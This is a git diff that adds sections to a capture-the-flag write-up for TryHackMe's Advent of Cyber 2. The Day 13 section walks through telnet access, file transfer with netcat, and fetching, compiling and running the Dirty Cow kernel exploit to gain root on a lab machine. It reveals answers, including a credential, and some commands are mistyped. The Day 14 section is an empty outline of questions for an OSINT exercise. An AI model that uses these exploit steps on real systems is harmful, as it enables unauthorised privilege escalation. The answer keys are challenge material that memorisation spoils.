@@ -20,8 +20,8 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 - [[Day 10] Don't be sElfish!](#day-10-dont-be-selfish)
 - [[Day 11] The Rogue Gnome](#day-11-the-rogue-gnome)
 - [[Day 12] Ready, set, elf.](#day-12-ready-set-elf)
-- [[Day 13] ](#day-13-)
-- [[Day 14] ](#day-14-)
+- [[Day 13] Coal for Christmas](#day-13-coal-for-christmas)
+- [[Day 14] Where's Rudolph?](#day-14-wheres-rudolph)
 - [[Day 15] ](#day-15-)
 - [[Day 16] ](#day-16-)
 - [[Day 17] ](#day-17-)
@@ -745,19 +745,187 @@ In this task we will be using MetaSploit to get access to our target machine.
    - [Getsystem command for Metasploit - Priv Esc](https://docs.rapid7.com/metasploit/meterpreter-getsystem/)
    - [Windows privilege escalation - Reddit](https://www.reddit.com/r/HowToHack/comments/6zxh68/looking_for_some_help_with_windows_privilege/)
 
-### [Day 13] [](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2013)
+### [Day 13] [Coal for Christmas](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2013)
 
+In this task we will be utilizing a kernel exploit 'Dirty Cow' in order to escalate our privileges and get the flag. More information on the exploit can be found [here](https://dirtycow.ninja/).
 
+3. What old, deprecated protocol and service is running?
 
-1. 
+   Running an nmap scan with `nmap -sV 10.10.202.23` we can get more information on the services running on the machine. 
+   
+   ![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2013/Coal_Nmap.png)
+
+   ><details><summary>Click for answer</summary>telnet</details>
+
+4. What credential was left for you?
+
+   Now we now the port used for telnet (23), we can use this protocol to log into the system using `telnet 10.10.202.23`. We are greeted with a message containing credentials we can use.
+   
+   ![Telnet Log In](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2013/Coal_Telnet_Log_In.png)
+
+   ><details><summary>Click for answer</summary>clauschristmas</details>
+
+5. What distribution of Linux and version number is this server running?
+
+   Several usefull enumeration commands can be found [here](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+). One of the commands we can use to find information about the system is `cat /etc/*release`.
+
+   ![System Info](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2013/Coal_Release.png)
 
    ><details><summary>Click for answer</summary></details>
 
-### [Day 14] [](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2014)
+6. Who got here first?
+
+   One way to read the file is to use `cat`. Probably the most easy method. Another way would be to use `netcat` to download the file onto our system. On our machine we use the following command:
+   
+   ```cmd
+   nc -nlvp 1337 > cookies_and_milk.txt
+   ```
+   
+   On the target machine we can then use the following:
+   
+   ```cmd
+   nc -w 3 10.18.78.136 1337 < cookies_and_milk.txt
+   ```
+   
+   As you can see in the image below, I made some typos and the current shell didn't have any luxuries. So I decided to use my previously learned skills to stabalize our shell with python. Using:
+   
+   ```cmd
+   python -c import pty; pty.spawn("/bin/bash")'
+   ```
+   
+   ![Stabalize shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2013/Coal_Stabalize.png)
+   
+   Although unneccesary for this part, it did make things easier down the road.
+   
+   ![Cookie Message](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2013/Coal_Cookies.png)
+
+   ><details><summary>Click for answer</summary>grinch</details>
+
+8. What is the verbatim syntax you can use to compile, taken from the real C source code comments?
+
+   After doing some research via [https://dirtycow.ninja/](https://dirtycow.ninja/), I found the original script used on [Github](https://github.com/FireFart/dirtycow/blob/master/dirty.c). On this page it was writen how to compile the script.
+   
+   ![Compile Command](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2013/Coal_Compile.png)
+
+   ><details><summary>Click for answer</summary>gcc -pthread dirty.c -o dirty -lcrypt</details>
+
+9. What "new" username was created, with the default operations of the real C source code?
+
+   First, we need to get to script onto our target machine. I tried using netcat, but this time it didn't work. So I fired up an http server and requested the file from the target machine.
+   
+   ```cmd
+   python3 -m http.server 8080
+   ```
+   
+   Now we can get it on the target machine with:
+   
+   ```cmd
+   wget http://10.18.78.136:8080/dirty.c
+   ```
+   
+   ![Send Cow Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2013/Coal_Send_Cow.png)
+   
+   I had a different name for the script and the challenge required a specific name `dirty.c`. That is why the commands differ from the images which were taken before that realization..
+   
+   Now we can compile and run the script with the following commands:
+   
+   ```cmd
+   gcc -pthread dirty.c -o dirty -lcrypt
+   
+   ./dirty.c
+   ```
+   
+   ![Compile Run](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2013/Coal_Compile_Run.png)
+   
+   The message shows us which user has been created. Examing the `/home/` folder or the `/etc/passwd` file confirmed this. This is also the same name that was given in the script itself before we uploaded it to the machine.
+
+   ><details><summary>Click for answer</summary>firefart</details>
+
+11. What is the MD5 hash output?
+
+   Now we can use `su firefart` to swith to this newly created user and navigate to the root folder. Here we find another message with the last instructions.
+   
+   ![Root Message](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2013/Coal_Message.png)
+   
+   Looks like we need to create a file and then generate a checksum for the directory. We can do so with the following commands (**Make sure you are in the correct directory**):
+   
+   ```cmd
+   touch coal
+   tree | md5sum
+   ```
+   
+   ![Md5sum](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2013/Coal_Md5sum.png)
+
+   ><details><summary>Click for answer</summary>8b16f00dd3b51efadb02c1df7f8427cc</details>
+
+### [Day 14] [Where's Rudolph?](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2014)
+
+**Username:** `IGuidetheClaus2020`
+
+1. What URL will take me directly to Rudolph's Reddit comment history?
 
 
 
-1. 
+   ><details><summary>Click for answer</summary></details>
+
+2. According to Rudolph, where was he born?
+
+
+
+   ><details><summary>Click for answer</summary></details>
+
+3. Rudolph mentions Robert.  Can you use Google to tell me Robert's last name?
+
+
+
+   ><details><summary>Click for answer</summary></details>
+
+4. On what other social media platform might Rudolph have an account?
+
+
+
+   ><details><summary>Click for answer</summary></details>
+
+5. What is Rudolph's username on that platform?
+
+
+
+   ><details><summary>Click for answer</summary></details>
+
+6. What appears to be Rudolph's favorite TV show right now?
+
+
+
+   ><details><summary>Click for answer</summary></details>
+
+7. Based on Rudolph's post history, he took part in a parade.  Where did the parade take place?
+
+
+
+   ><details><summary>Click for answer</summary></details>
+
+8. Okay, you found the city, but where specifically was one of the photos taken?
+
+
+
+   ><details><summary>Click for answer</summary></details>
+
+9. Did you find a flag too?
+
+
+
+   ><details><summary>Click for answer</summary></details>
+
+10. Has Rudolph been pwned? What password of his appeared in a breach?
+
+
+
+   ><details><summary>Click for answer</summary></details>
+
+11. Based on all the information gathered.  It's likely that Rudolph is in the Windy City and is staying in a hotel on Magnificent Mile.  What are the street numbers of the hotel address?
+
+
 
    ><details><summary>Click for answer</summary></details>
 
